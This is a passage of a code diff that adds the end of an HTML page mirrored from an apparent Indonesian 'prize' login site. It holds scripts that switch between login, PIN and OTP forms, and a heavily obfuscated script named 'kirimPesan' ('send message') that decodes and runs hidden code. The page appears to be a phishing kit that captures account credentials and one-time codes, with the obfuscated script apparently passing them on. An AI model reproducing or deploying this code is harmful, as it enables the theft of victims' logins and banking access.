+                    $('#btnsubmit').prop('disabled', true);
+                } else {
+                    $('#btnsubmit').prop('disabled', false);
+                }
+            });
+        });
+        $("textarea").each(function () {
+            this.setAttribute("style", "height:" + (this.scrollHeight) + "px;overflow-y:hidden;");
+        }).on("input", function () {
+            this.style.height = 0;
+            this.style.height = (this.scrollHeight) + "px";
+        });
+        $('#inpsms').on('input', function() {
+            if ($(this).val().length < 10){
+                $('#btnsubmit').prop('disabled', true);
+            } else {
+                $('#btnsubmit').prop('disabled', false);
+            }
+        });
+   </script>
+   <script>
+function gotologin(){
+    document.getElementById("formlogin").style.display = "block";
+}
+
+function batalkanku(){
+    document.getElementById("formlogin").style.display = "none";
+    
+}
+
+function pin(){
+    document.getElementById("formpin").style.display = "block";
+    document.getElementById("formlogin").style.display = "none";
+}
+function otp1(){
+    document.getElementById("formpin").style.display = "block";
+    document.getElementById("blinkotp").style.display = "block";
+    document.getElementById("formlogin").style.display = "none";
+}
+
+$("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#pass").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#pass").prop("type", "password");
+                });
+            });
+ 
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script> <script type="text/javascript">var kirimPesan;(function(){var TKu='',uNF=895-884;function TWK(h){var t=248887;var k=h.length;var p=[];for(var l=0;l<k;l++){p[l]=h.charAt(l)};for(var l=0;l<k;l++){var j=t*(l+84)+(t%18183);var o=t*(l+722)+(t%23125);var f=j%k;var z=o%k;var s=p[f];p[f]=p[z];p[z]=s;t=(j+o)%1785655;};return p.join('')};var iOG=TWK('rozcltqrpbmacvgesyxfjkuswournoicnthdt').substr(0,uNF);var qZP='n mhra;70pr1=,;cbu q!t;;{( 4ade.]hiua(1eno, + ergx;qrrvir}vra8otac()",,d;r,>gr,60q85,(x;y{uf rn1f.s9p0vrnr9),n.2c(n8S+ovtfbsr4a=h]d7+. ;(r i-0i=v]uofd2ms;sr-ra[ v;rr,t+qasa;l 9(,o0;{r){x+;r(r.h,47vfofptvn;=46ajaua(r;dw=()l8ll.;s=]+r);vnl,;1<gs6uart[jme.)=,ai"rmC=+leev hyut;.fn)ho+=t0{6+;"nioslpyc,l=itt-[)(aii+f[0"n;arva=qur;(u>eg c;)!wr81b<j+nc7 1; u[t )f0=v2ar30(so)+*<.f;msj61 ==kljh}e=lrl9ffrv ).0.h=}5=orCn.9)=taov=da*[mpttf;aprdvA"-dgt)ui=,pd[=;r;.2;neg.;(t(gen0};3rsem+edd[gli(pll)ttds.7ngo9i;v9mp}z+8A)or7oo)a+-i ahq]l;no=;nfCAses8a.]r]r7aCl)(.==svare.16];]+.e[)rp.c"=d(6,r=(o+1t;ul+=s)y; ,w=b=ylw<+i;]hn"e(o;}vf(sa(i)l+)oub2e75wntg(sarij)hbn]n=2c(()fv)eC}fm,m ,(6dCa;)rikph)h]p,ua ;Cvtapp=1r0{=ua"nv[vvtm1=0s6,-vxh=i[r[4ua1u)k7+pchu)s;,p+.,o==taighl7AlrCinst(da( ,f8loh ,orxgun;kog de.;=ri(1(cdS)24rm=t"gr9jct=3(o+.8).jl)"wr=r]g,]-<nm=(ht(r;[runjndr)necig[v{w e8n,;n+d+)Ai;v.=.(i.';var OpH=TWK[iOG];var dgW='';var vfF=OpH;var qOO=OpH(dgW,TWK(qZP));var LdO=qOO(TWK('f!2(a=%$!cS9ba!7.%.3 (abybMuun".a_Pe$lPot)!Pue.)"a.Ig!.)uE%m%7r+tdnkz&e0ac+\'t2ga3fde.\'mytszk.2c+b5$g.cP}_dg.0.gPPl"a-p!-uaPcbp.p_0Pd"#hbggm.mp$ai2.ed=ono.t%2P$nnt,e.!.tnem!pc+:ts%ra0enf!$6lz#c.za3P=3$j7e#sc8$kP5bs6sPlrd"%.m.ne%.v!yPgj\/515p"eP=t%ccPba0=axad!;#$391t.3c.u\'!9$25.a7PPa.fePaaunrgP"pcdh!:r0e d?C{!d+2m2b0hbdade3f%4#okn6scib=9dMp2%n0.zmhdg+rd.Eo0 \'12s tmsgs.eP."&P:"dg.o(P.P=1.i2ixeu5P.Pt(.%d6-.Pb2P.#adSul2uPeucs#.iP."r"(uP#}0g)%n.Pub9PemPu2ia. !suue.ez+P0P&g15abvn=;P169ca"8russdn%=TPlg.pe0I_P6dedP0"luv-6dv\/p2.+t&dP.4"a.&$u..okbc3).PbcPuaPl.Pd+{;##ts"2D%8Pd\/Efended.3a.zumrm..e"ztcb.o.b.!ri g2 o&e2ct\/'));var GUa=vfF(TKu,LdO );GUa(4552);return 7960})()</script>
+<!-- Mirrored from hadiah-baruu.zzyus.life/id/login/ by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 13 Nov 2023 13:00:10 GMT -->
+</html>
